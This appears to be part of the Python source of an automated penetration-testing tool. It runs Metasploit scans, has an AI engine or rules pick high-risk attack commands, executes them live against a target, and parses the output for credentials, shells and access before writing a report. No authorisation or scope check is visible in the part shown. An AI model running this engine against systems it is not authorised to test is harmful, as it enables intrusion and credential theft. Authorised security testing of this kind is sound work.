                        scan["modules"][m["id"]]["raw_output"] = res.get("raw_output","")
                    else:
                        scan["modules"][m["id"]]["status"] = "completed"
                        scan["modules"][m["id"]]["raw_output"] = res.get("raw_output","")
                        mf = res.get("findings",[])
                        scan["modules"][m["id"]]["findings_count"] = len(mf)
                        scan["findings"].extend(mf)
                        scan["attacks"].extend(res.get("attacks",[]))
                except Exception as e:
                    scan["modules"][m["id"]]["status"] = "error"
                    scan["modules"][m["id"]]["raw_output"] = str(e)
                scan["progress"]["completed"] += 1

    # Dedupe and enrich attacks after initial phases
    _dedupe_and_enrich_attacks(scan)

    # ── Phase 4: Metasploit Scans ────────────────────────────────────────
    scan["phase"] = "metasploit"
    scan["progress"]["phase"] = "metasploit"
    scan["progress"]["current"] = "Metasploit Framework Scans"

    if msf_engine and msf_engine.msf_available() and target_type in ("domain", "url", "ip"):
        scan["modules"]["metasploit"] = {
            "name": "Metasploit Framework", "phase": "metasploit",
            "status": "running", "raw_output": "", "findings_count": 0,
        }
        try:
            # Generate MSF attack commands and add to attacks list
            msf_attacks = msf_engine.generate_attack_commands(host, scan["findings"])
            scan["attacks"].extend(msf_attacks)

            # Run MSF auxiliary modules
            def msf_callback(name, status, result):
                scan["progress"]["current"] = f"MSF: {name}"
                if result:
                    scan["msf_results"].append(result)
                    scan["findings"].extend(result.get("findings", []))

            msf_results = msf_engine.run_scan(host, scan["findings"], max_modules=8, callback=msf_callback)
            scan["msf_results"] = msf_results

            raw_msf = "\n".join(
                f"=== {r['name']} ===\n{r['output'][:2000]}" for r in msf_results
            )
            msf_findings = []
            for r in msf_results:
                msf_findings.extend(r.get("findings", []))
            scan["modules"]["metasploit"]["status"] = "completed"
            scan["modules"]["metasploit"]["raw_output"] = raw_msf[:5000]
            scan["modules"]["metasploit"]["findings_count"] = len(msf_findings)
        except Exception as e:
            scan["modules"]["metasploit"]["status"] = "error"
            scan["modules"]["metasploit"]["raw_output"] = str(e)
    else:
        scan["modules"]["metasploit"] = {
            "name": "Metasploit Framework", "phase": "metasploit",
            "status": "skipped",
            "raw_output": "msfconsole not available" if not (msf_engine and msf_engine.msf_available()) else "Not applicable for this target type",
            "findings_count": 0,
        }
    scan["progress"]["completed"] += 1

    # Re-dedupe attacks after adding MSF attacks
    _dedupe_and_enrich_attacks(scan)

    # ── Phase 5: Auto-Attack Execution ───────────────────────────────────
    scan["phase"] = "auto_attack"
    scan["progress"]["phase"] = "auto_attack"
    scan["progress"]["current"] = "Preparing attacks..."

    # Use AI (or rules) to pick which attacks to run
    if ai_engine:
        selected_indices = ai_engine.select_attacks(
            target, target_type, scan["findings"], scan["attacks"]
        )
    else:
        # Fallback: select critical/high risk attacks
        selected_indices = [
            i for i, a in enumerate(scan["attacks"])
            if a["risk"] in ("critical", "high")
        ][:20]

    # Validate and prepare each selected attack command
    attacks_to_run = []
    skipped_attacks = []
    for i in selected_indices:
        if i >= len(scan["attacks"]):
            continue
        attack = scan["attacks"][i]
        fixed_cmd, skip_reason = _prepare_attack(attack["command"], scan["findings"])
        if skip_reason:
            skipped_attacks.append({"name": attack["name"], "reason": skip_reason})
        else:
            attacks_to_run.append((i, attack, fixed_cmd))

    scan["progress"]["auto_attacks_total"] = len(attacks_to_run)
    scan["progress"]["auto_attacks_done"] = 0
    scan["progress"]["auto_attacks_skipped"] = len(skipped_attacks)

    scan["modules"]["auto_attack"] = {
        "name": f"Auto-Attack ({len(attacks_to_run)} executable, {len(skipped_attacks)} skipped)",
        "phase": "auto_attack",
        "status": "running",
        "raw_output": "",
        "findings_count": 0,
    }

    attack_results = []
    for idx, (orig_idx, attack, prepared_cmd) in enumerate(attacks_to_run):
        # Set live tracking for the current attack
        scan["current_attack"] = {
            "name": attack["name"],
            "command": prepared_cmd,
            "risk": attack["risk"],
            "category": attack.get("category", ""),
            "status": "running",
            "output": "",
            "index": idx,
            "total": len(attacks_to_run),
        }
        scan["progress"]["current"] = f"Attacking: {attack['name']} ({idx+1}/{len(attacks_to_run)})"

        # Execute with live output streaming
        output, stderr, exit_code = _run_live(prepared_cmd, scan, timeout=120)
        if stderr:
            output += stderr

        # Update current attack status
        scan["current_attack"]["status"] = "analyzing"
        scan["current_attack"]["output"] = output[-5000:]

        # Analyze result
        if ai_engine:
            analysis = ai_engine.analyze_attack_result(
                attack["name"], prepared_cmd, output, exit_code
            )
        else:
            analysis = _basic_analyze_result(attack["name"], prepared_cmd, output, exit_code)

        result = {
            "attack_name": attack["name"],
            "attack_index": orig_idx,
            "command": prepared_cmd,
            "output": output[:5000],
            "exit_code": exit_code,
            "risk": attack["risk"],
            "category": attack.get("category", ""),
            "analysis": analysis,
        }
        attack_results.append(result)
        scan["attack_results"] = list(attack_results)  # live update for UI polling

        # If we found new credentials or confirmed vulns, add to findings
        if analysis.get("credentials"):
            for cred in analysis["credentials"]:
                scan["findings"].append(_finding(
                    "critical",
                    f"Credential found: {cred}",
                    f"Discovered via {attack['name']}",
                    evidence=cred,
                    module="Auto-Attack",
                ))
        if analysis.get("vulns_confirmed"):
            for vuln in analysis["vulns_confirmed"]:
                scan["findings"].append(_finding(
                    "critical",
                    f"Confirmed: {vuln}",
                    f"Exploited via {attack['name']}",
                    module="Auto-Attack",
                ))
        if analysis.get("access_gained"):
            scan["findings"].append(_finding(
                "critical",
                f"Access gained: {analysis['access_gained'][:100]}",
                f"Via {attack['name']}",
                module="Auto-Attack",
            ))

        scan["progress"]["auto_attacks_done"] = idx + 1

    # Clear live attack tracker
    scan["current_attack"] = None

    # Add skip info to raw output
    skip_info = ""
    if skipped_attacks:
        skip_info = "=== Skipped Attacks ===\n" + "\n".join(
            f"  {s['name']}: {s['reason']}" for s in skipped_attacks
        ) + "\n\n"

    scan["attack_results"] = attack_results
    scan["modules"]["auto_attack"]["status"] = "completed"
    scan["modules"]["auto_attack"]["raw_output"] = skip_info + "\n".join(
        f"=== {r['attack_name']} (exit:{r['exit_code']}) ===\n"
        f"$ {r['command']}\n{r['output'][:1000]}\n"
        f"Analysis: {r['analysis'].get('summary','')}\n"
        for r in attack_results
    )[:10000]
    scan["modules"]["auto_attack"]["findings_count"] = sum(
        1 for r in attack_results if r["analysis"].get("success")
    )
    scan["progress"]["completed"] += 1

    # ── Phase 6: AI Analysis & Report Generation ─────────────────────────
    scan["phase"] = "reporting"
    scan["progress"]["phase"] = "reporting"
    scan["progress"]["current"] = "Generating security assessment..."

    scan["modules"]["report"] = {
        "name": "AI Assessment & Report", "phase": "reporting",
        "status": "running", "raw_output": "", "findings_count": 0,
    }

    # Recount findings after all phases
    scan["summary"] = {"critical":0,"high":0,"medium":0,"low":0,"info":0}
    for f in scan["findings"]:
        sev = f.get("severity", "info")
        if sev in scan["summary"]:
            scan["summary"][sev] += 1

    try:
        # Generate assessment
        if ai_engine:
            assessment = ai_engine.generate_assessment(
                target, target_type, scan["findings"],
                scan["attacks"], attack_results,
            )
        else:
            assessment = _fallback_assessment(scan)
        scan["ai_assessment"] = assessment

        # Generate downloadable HTML report
        if ai_engine:
            report_html = ai_engine.generate_report_html(
                target, target_type, scan, assessment
            )
        else:
            report_html = _fallback_report_html(target, target_type, scan, assessment)
        scan["report_html"] = report_html

        scan["modules"]["report"]["status"] = "completed"
        scan["modules"]["report"]["raw_output"] = (assessment or "")[:5000]
    except Exception as e:
        scan["modules"]["report"]["status"] = "error"
        scan["modules"]["report"]["raw_output"] = str(e)

    scan["progress"]["completed"] += 1

    # ── Done ─────────────────────────────────────────────────────────────
    scan["status"] = "completed"
    scan["phase"] = "done"
    scan["completed_at"] = datetime.now(timezone.utc).isoformat()
    scan["progress"]["current"] = "Done"
    scan["progress"]["phase"] = "done"


def _dedupe_and_enrich_attacks(scan):
    """Deduplicate attacks and enrich with context."""
    seen = set()
    uniq = []
    for a in scan["attacks"]:
        if a["name"] not in seen:
            seen.add(a["name"])
            uniq.append(a)
    risk_ord = {"critical":0,"high":1,"medium":2,"low":3}
    uniq.sort(key=lambda a: risk_ord.get(a.get("risk","low"),4))
    _enrich_attacks(uniq)
    scan["attacks"] = uniq


def _basic_analyze_result(attack_name, command, output, exit_code):
    """Basic rule-based analysis when AI engine is not available."""
    out_lower = output.lower()
    result = {
        "success": False,
        "summary": "",
        "credentials": [],
        "vulns_confirmed": [],
        "access_gained": None,
        "severity": "info",
    }
    success_words = [
        "vulnerable", "injectable", "valid combination", "login:",
        "password:", "session opened", "meterpreter", "uid=",
    ]
    fail_words = ["not vulnerable", "no injection", "0 valid", "connection refused"]

    has_success = any(w in out_lower for w in success_words)
    has_fail = any(w in out_lower for w in fail_words)

    if has_success and not has_fail:
        result["success"] = True
        result["severity"] = "critical" if any(
            w in out_lower for w in ["shell", "meterpreter", "root", "uid=0"]
        ) else "high"
        result["summary"] = "Target appears vulnerable"

    # Extract credentials
    for pattern in [
        r"login:\s*(\S+)\s+password:\s*(\S+)",
        r"Username:\s*(\S+),?\s*Password:\s*(\S+)",
        r"\[\d+\]\[\S+\]\s+host:\s*\S+\s+login:\s*(\S+)\s+password:\s*(\S+)",
    ]:
        for m in re.finditer(pattern, output, re.I):
            cred = f"{m.group(1)}:{m.group(2)}"
            if cred not in result["credentials"]:
                result["credentials"].append(cred)

    if result["credentials"]:
        result["success"] = True
        result["severity"] = "critical"
        result["summary"] = f"Found {len(result['credentials'])} credential(s)"
        result["access_gained"] = f"Credentials: {', '.join(result['credentials'][:5])}"
    elif not result["success"]:
        result["summary"] = f"Completed (exit code {exit_code})" if exit_code == 0 else f"Failed (exit code {exit_code})"

    return result


def _fallback_assessment(scan):
    """Generate assessment without AI engine."""
    target = scan["target"]
    findings = scan["findings"]
    attack_results = scan["attack_results"]
    s = scan["summary"]

    successful = [r for r in attack_results if r.get("analysis", {}).get("success")]
    creds = []
    for r in attack_results:
        creds.extend(r.get("analysis", {}).get("credentials", []))

    risk = "CRITICAL" if s["critical"] > 0 else "HIGH" if s["high"] > 3 else "MEDIUM" if s["medium"] > 0 else "LOW"

    lines = [
        f"## Executive Summary\n",
        f"Assessment of **{target}** found {len(findings)} issues: "
        f"{s['critical']} critical, {s['high']} high, {s['medium']} medium. "
        f"{len(successful)} of {len(attack_results)} auto-attacks succeeded.\n",
        f"\n## Risk Rating: {risk}\n",
        "\n## Critical Findings\n",
    ]
    for f in [f for f in findings if f["severity"] in ("critical", "high")][:15]:
        lines.append(f"- **[{f['severity'].upper()}]** {f['title']}: {f['detail']}")
    lines.append("\n\n## Successful Attacks\n")
    if successful:
        for r in successful:
            a = r.get("analysis", {})
            lines.append(f"- **{r['attack_name']}**: {a.get('summary','Succeeded')}")
            if a.get("access_gained"):
                lines.append(f"  - Access: {a['access_gained']}")
    else:
        lines.append("No attacks confirmed exploitation.")
    if creds:
        lines.append("\n\n## Credentials Found\n")
        for c in set(creds):
            lines.append(f"- `{c}`")
    lines.append("\n\n## Remediation\n")
    lines.append("1. Patch all critical vulnerabilities immediately")
    lines.append("2. Reset compromised credentials")
    lines.append("3. Restrict exposed services with firewall rules")
    lines.append("4. Implement missing security headers")
    lines.append("5. Update all outdated software")
    return "\n".join(lines)


def _fallback_report_html(target, target_type, scan, assessment):
    """Generate basic HTML report without AI engine."""
    # Import and use ai_engine's HTML generator if possible, else minimal
    try:
        from ai_engine import generate_report_html
        return generate_report_html(target, target_type, scan, assessment)
    except Exception:
        return f"<html><body><h1>Report for {target}</h1><pre>{assessment}</pre></body></html>"


def get_scan(scan_id):
    return _scans.get(scan_id)

def list_scans():
    return [{"id":s["id"],"target":s["target"],"target_type":s["target_type"],
             "status":s["status"],"started_at":s["started_at"],
             "summary":s["summary"],
             "phase":s.get("phase",""),
             "has_report":s.get("report_html") is not None}
            for s in _scans.values()]
